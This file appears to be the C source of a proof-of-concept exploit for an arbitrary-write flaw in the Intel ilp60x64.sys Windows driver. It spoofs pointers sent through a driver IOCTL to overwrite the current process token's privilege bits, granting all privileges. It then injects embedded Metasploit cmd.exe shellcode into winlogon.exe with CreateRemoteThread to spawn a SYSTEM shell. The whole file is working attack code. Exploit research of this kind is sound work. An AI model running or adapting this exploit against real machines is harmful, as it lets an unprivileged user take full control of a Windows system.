// Win10 x64 - Release 
#include <windows.h>
#include <winternl.h>
#include <TlHelp32.h>
#include <stdio.h>

#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004
#define SystemHandleInformation		16
#define SepPrivilegesOffset			0x40

typedef unsigned long long QWORD; // == DWORD64	

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
    ULONG       ProcessId;
    UCHAR       ObjectTypeNumber;
    UCHAR       Flags;
    USHORT      Handle;
    QWORD       Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG			NumberOfHandles;
    SYSTEM_HANDLE	Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

// Some global variables that will need to be used by the main and the thread
OBJECT_ATTRIBUTES   objAttr;
IO_STATUS_BLOCK     ioBlock;
HANDLE              hDriver;
LPVOID              lpInMemoryArea;
LPVOID              lpOutMemoryArea;
LPVOID              lpJumperArea;
LPVOID              lpBackupBuffer;
QWORD               qwPresentBytesOffset;
QWORD               qwEnableBytesOffset;
QWORD               qwEnableDefualtOffset;
ULONG               ulIoctl = 0x12C81C;

DWORD getProcessId(LPCWSTR szName) {
    PROCESSENTRY32W	procEntry32;
    HANDLE          hSnapshot;
    DWORD           dwPid;

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to to get handle from CreateToolhelp32Snapshot()\n");
        return(-1);
    }
    procEntry32.dwSize = sizeof(PROCESSENTRY32);
    Process32FirstW(hSnapshot, &procEntry32);
    do {
        if (lstrcmpiW(procEntry32.szExeFile, szName) == 0) {
            dwPid = procEntry32.th32ProcessID;
            return(dwPid);
        }
    } while (Process32Next(hSnapshot, &procEntry32));
    CloseHandle(hSnapshot);
    return(0);
}

BOOL createSystemShell() {
    LPCWSTR		lpszProcess = L"winlogon.exe";
    HANDLE		hProcess;
    HANDLE		hThread;
    LPVOID		lpMemory;
    DWORD		dwPid;
    // windows/x64/exec - 275 bytes http://www.metasploit.com
    // VERBOSE=false, PrependMigrate=false, EXITFUNC=thread, CMD=cmd.exe
    char arrCMDShellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00";

    dwPid = getProcessId(lpszProcess);
    if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)) == NULL) {
        printf("[!] OpenProcess failed on %ls process\n", lpszProcess);
        return(FALSE);
    }
    printf("[i] Opened %ls process with PROCESS_ALL_ACCESS rights\n", lpszProcess, dwPid);
    if ((lpMemory = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)) == NULL) {
        printf("[!] VirtualAllocEx failed\n");
        return(FALSE);
    }
    printf("[i] Memory allocated at address 0x%I64X\n", lpMemory);
    if (!(WriteProcessMemory(hProcess, lpMemory, arrCMDShellcode, sizeof(arrCMDShellcode), NULL))) {
        printf("[!] WriteProcessMemory failed\n");
        return(FALSE);
    }
    if ((hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpMemory, NULL, 0, NULL)) == NULL) {
        CloseHandle(hThread);
        printf("[!] CreateRemoteThread failed\n");
        return(FALSE);
    }
    printf("[i] Spawing system shell\n");
    return(TRUE);
}

QWORD getTokenAddrOfCurrentProcess() {
    PSYSTEM_HANDLE_INFORMATION  pSysHandleInfo;
    HANDLE                      hToken;
    QWORD                       qwTokenAddr;
    DWORD                       dwSize;
    DWORD                       dwProcessId;
    ULONG                       ulReturn;

    dwProcessId = GetCurrentProcessId();
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        printf("[!] Failed at OpenProcessToken() \n");
        return(-1);
    }
    dwSize = 0x3000;
    pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), 0, dwSize);
    while (NtQuerySystemInformation(SystemHandleInformation, pSysHandleInfo, dwSize, &ulReturn) == STATUS_INFO_LENGTH_MISMATCH) {
        HeapFree(GetProcessHeap(), 0, pSysHandleInfo);
        dwSize += 0x3000;
        pSysHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), 0, dwSize);
    }
    printf("[i] Current process ID %d with token handle value %u\n", GetCurrentProcessId(), hToken);
    for (ULONG i = 0; i < pSysHandleInfo->NumberOfHandles; i++) {
        if ((pSysHandleInfo->Handles[i].ProcessId == dwProcessId) && (pSysHandleInfo->Handles[i].Handle == hToken)) {
            qwTokenAddr = pSysHandleInfo->Handles[i].Object;
        }
    }
    HeapFree(GetProcessHeap(), 0, pSysHandleInfo);
    return(qwTokenAddr);
}
void callDriver() {
    // Sizes for input and output buffer must be 0x20
    NtDeviceIoControlFile(hDriver, NULL, NULL, NULL, &ioBlock, ulIoctl, lpInMemoryArea, 0x20, lpOutMemoryArea, 0x20);
    // ^ This hangs the driver, and code execution never continues. The thread must be killed.
}

int main(int argc, char* argv[]) {
    UNICODE_STRING      usDriverName;
    NTSTATUS            ntRet;
    HANDLE              hThread;
    QWORD               qwWriteAddress;
    DWORD               dwThreadId;

    // Obligatory banner
    printf("--------------------------------------------------------------\n");
    printf("        Intel ilp60x64.sys Arbitrary Write PoC Exploit        \n");
    printf("               - Michael (DownWithUp)				          \n");
    printf("--------------------------------------------------------------\n");

    RtlInitUnicodeString(&usDriverName, L"\\Device\\illdpprot");
    InitializeObjectAttributes(&objAttr, &usDriverName, 0, NULL, 0);
    ntRet = NtOpenFile(&hDriver, FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE, &objAttr, &ioBlock, FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);

    if (NT_SUCCESS(ntRet)) {
        qwWriteAddress = getTokenAddrOfCurrentProcess();
        printf("[i] Address of current process token 0x%I64X\n", qwWriteAddress);
        qwWriteAddress += SepPrivilegesOffset;
        printf("[i] Address of _SEP_TOKEN_PRIVILEGES 0x%I64X will be overwritten\n", qwWriteAddress);
        qwPresentBytesOffset = qwWriteAddress + 0x2;
        printf("[i] Present bits at 0x%I64X will be overwritten with a pointer\n", qwPresentBytesOffset);
        qwEnableBytesOffset = qwWriteAddress + 0xa;
        printf("[i] Enabled bits at 0x%I64X will be overwritten with a pointer\n", qwEnableBytesOffset);
        qwEnableDefualtOffset = qwWriteAddress + 0xa + 0x8;
        printf("[i] Enabled bits at 0x%I64X will be overwritten with a pointer\n", qwEnableDefualtOffset);
        /*
            _SEP_TOKEN_PRIVILEGES has 3 QWORD bit fields.
            +0x000 Present          : Uint8B
            +0x008 Enabled          : Uint8B
            +0x010 EnabledByDefault : Uint8B
            We always get a kernel pointer that starts with: ffffxxxxxxxxxxxx
            Using the hex "f" we can overwrite the Presnt and Enabled bit fields.
            Consequently, EnabledByDefault will have the leftover bits, but that field is irrellevent.
        */

        printf("[i] Found driver. NTSTATUS: %X\n", ntRet);
        printf("Press [ENTER] to continue...\n");
        getchar();
        lpInMemoryArea = VirtualAlloc((LPVOID)0x41000000, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        lpOutMemoryArea = VirtualAlloc((LPVOID)0x42000000, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        lpJumperArea = VirtualAlloc(0x43000000, 0x18, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        lpBackupBuffer = VirtualAlloc(0xFFFFFF0000, 0x300, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

        if ((lpInMemoryArea == NULL) || (lpOutMemoryArea == NULL) || (lpJumperArea == NULL) || (lpBackupBuffer == NULL)) {
            printf("[!!!] Unable to allocate memory\n"); // All memory allocations must be successful
            ExitProcess(-1);
        }
        printf("[i] Allocated memory and setting up exploit addresses\n");
        /*
            FS = For Spoof. The driver makes a lot of memory checks to pointers
            that we must succsfully spoof in order for this exploit to work
        */
        QWORD qwMov = 0x43000000; // lpJumperArea
        memmove((BYTE*)lpInMemoryArea + 0x8, &qwMov, sizeof(QWORD));
        qwMov = 0x69446C50; // FS: Possibly some type of pool tag...
        memmove((BYTE*)lpJumperArea + 0x10, &qwMov, sizeof(QWORD));
        qwMov = 0xFFFFFF0000; // lpBackupBuffer
        memmove((BYTE*)lpInMemoryArea + 0x10, &qwMov, sizeof(QWORD));
        qwMov = 0x69446C50; // FS: Possibly some type of pool tag...
        memmove((BYTE*)lpBackupBuffer + 0x128, &qwMov, sizeof(QWORD));
        qwMov = 0x4; // FS: For cmp al, 4
        memmove((BYTE*)lpBackupBuffer + 0x10, &qwMov, sizeof(QWORD));
        qwMov = 0xFFFFFF00A0; // FS: Self for cmp [r12], r12 
        memmove((BYTE*)lpBackupBuffer + 0xA0, &qwMov, sizeof(QWORD));
        /*
            We have to have a thread do the work NtDeviceIoControlFile call because
            because the driver never calls IofCompleteRequest on our IRP. This is another
            design flaw in the driver. Because all driver calls hang, calls must be inside
            threads which can be killed.
        */
        // Abuse the fact that our virtual address starts with FFFFFFxxxx
        for (int i = 0; i <= 16; i += 0x8) {
            qwMov = qwPresentBytesOffset + i - 2;
            memmove((BYTE*)lpBackupBuffer + 0xA8, &qwMov, sizeof(QWORD)); // lpBackupBuffer + 0xA8 contains the "where" in "arbitrary write-where"
            hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)callDriver, NULL, 0, &dwThreadId);
            Sleep(50);
            TerminateThread(hThread, 0);
        }
        // [NOTE] Our process now has all known privileges, including SeDebugPrivilege, Tcb
        Sleep(2500);
        if (createSystemShell()) {
            printf("[i] Exploit Complete\n[i] In infinite sleep, use a tool to check the privileges of this process and the spawned shell!\n");
        }
        Sleep(INFINITE);
    }
    else {
        printf("[i] Unable to find driver. NTSTATUS: %X\n", ntRet);
        ExitProcess(-1);
    }
    ExitProcess(0);
}
